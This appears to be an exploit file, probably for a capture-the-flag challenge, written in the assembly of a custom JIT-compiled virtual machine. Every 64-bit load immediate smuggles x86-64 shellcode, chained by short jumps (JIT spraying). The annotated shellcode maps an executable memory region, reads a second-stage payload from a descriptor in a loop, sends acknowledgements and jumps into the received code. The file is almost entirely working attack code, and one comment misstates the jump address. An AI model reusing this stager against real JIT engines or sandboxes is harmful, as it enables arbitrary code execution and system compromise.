load <8> r0, [r13]
add r3, r13
load <8> r0, 0
//pad so jmp 0x48 has code
load <8> r0, 0
load <8> r0, 0
load <8> r0, 0
load <8> r0, 0
load <8> r0, 0
load <8> r0, 0
load <8> r0, 0x02eb9090909090cc  // nop ; nop ; nop ; nop ; nop

//setup local memory
load <8> r0, 0x02eb9000000009b8  // mov eax, 9 ; nop
load <8> r0, 0x02eb9010000000bf  // mov edi, 0x10000000 ; nop
load <8> r0, 0x02eb9000010000be  // mov esi, 0x10000 ; nop
load <8> r0, 0x02eb9000000007ba  // mov edx, 7 ; nop
load <8> r0, 0x02eb00000022ba41  // mov r10d, 0x22 ; nop
load <8> r0, 0x02ebc8ff49c0314d  // xor r8, r8 ; dec r8
load <8> r0, 0x02eb90050fc9314d  // xor r9, r9 ; syscall ; nop

//recv payload (through register)
load <8> r0, 0x02eb9010000000be  // mov esi, 0x10000000 ; nop
load <8> r0, 0x02eb9000000003bb  // mov ebx, 3 ; nop
  //recv loop
  //NEXT_RECV_LOOP:
    load <8> r0, 0x02eb9000000100bf  // mov edi, 0x100 ; nop
    //cleanup type / codeLen
    //NEXT_READ_HEADER:
      load <8> r0, 0x02eb9000000009ba  // mov edx, 9 ; nop
      load <8> r0, 0x02eb9000000000b8  // mov eax, 0 ; nop
      load <8> r0, 0x02eb9000f883050f  // syscall ; cmp eax, 0 ; nop
      load <8> r0, 0x02eb9090c229ea7e  // jle NEXT_READ_HEADER ; sub edx, eax ; nop ; nop
      load <8> r0, 0x02eb90dd7500fa83  // cmp rdx, 0 ; jne NEXT_READ_HEADER ; nop
    //read payload
    //NEXT_READ_PAYLOAD:
      load <8> r0, 0x02eb9000001100ba  // mov edx, 0x1100 ; nop
      load <8> r0, 0x02eb9000000000b8  // mov eax, 0 ; nop
      load <8> r0, 0x02eb9000f883050f  // syscall ; cmp eax, 0 ; nop
      load <8> r0, 0x02ebc601c229ea7e  // jle NEXT_READ_PAYLOAD ; sub edx, eax ; add esi, eax
      load <8> r0, 0x02eb90dd7500fa83  // cmp rdx, 0 ; jne NEXT_READ_PAYLOAD ; nop
    //write response
    load <8> r0, 0x02eb9000000101bf  // mov edi, 0x101 ; nop
    load <8> r0, 0x02eb9000000009ba  // mov edx, 9 ; nop
    load <8> r0, 0x02eb9000000001b8  // mov eax, 1 ; nop
    load <8> r0, 0x02ebffffff0106c7  // mov dword ptr [rsi], 0xffffff01
    load <8> r0, 0x02eb90909004c683  // add esi, 4 ; push rax ; nop ; nop ; nop
    load <8> r0, 0x02ebffffffff06c7  // mov dword ptr [rsi], 0xffffffff
    load <8> r0, 0x02ebff06c604c683  // add esi, 4 ; mov byte ptr [rsi], 0xff
    load <8> r0, 0x02eb90050f08ee83  // sub esi, 8 ; syscall ; nop
    //decrease cnter and loop
    load <8> r0, 0x02eb5900000000e8  // call NEXT_INSN ; pop rcx
    load <8> r0, 0x02ebcbff7fe98348  // sub rcx, 0x7f ; dec ebx
    load <8> r0, 0x02eb905144e98348  // sub rcx, 0x44 ; push rcx ; nop
    load <8> r0, 0x02ebc3057400fb83  // cmp ebx, 0 ; je LOOP_END ; ret
 //RECV_LOOP_END:

//jmp to received payload
load <8> r0, 0x02eb9010000000b8  // mov eax, 0x100000000 ; nop
load <8> r0, 0xcccccccccccce0ff  // jmp rax
